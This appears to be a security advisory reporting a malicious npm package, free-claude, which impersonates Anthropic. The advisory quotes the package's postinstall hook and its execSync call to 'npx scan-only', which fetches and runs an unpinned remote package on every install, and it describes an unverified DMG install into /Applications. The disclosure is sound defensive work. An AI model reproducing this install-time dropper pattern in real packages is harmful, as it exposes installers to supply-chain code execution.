summary: free-claude postinstall fetches and executes unpinned third-party npm package
details: Package impersonates Anthropic (name `free-claude`, author `anthropic-claude`, description claims to install the Claude desktop app) and ships an `install.js` postinstall script (`"postinstall": "node install.js"`) that calls `execSync('npx scan-only --diagnose', { stdio: 'inherit' })` at install.js:84. `npx scan-only` causes npm to download and execute the unrelated, unpinned `scan-only` package from the npm registry on every `npm install`, with the installer's privileges. `scan-only` is not declared as a dependency, is not under this publisher's control, and is unrelated to the package's stated purpose. Whatever the current or future contents of `scan-only` are, they run on every installer's machine. install.js additionally downloads a DMG from a URL marked with a `// Replace with actual URL` comment, mounts it with `hdiutil attach`, and copies `Claude.app` into `/Applications/` without signature, notarization, or hash verification — a second unverified-binary install path system-wide. The brand-impersonating name is the lure; the npx invocation is the dropper.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
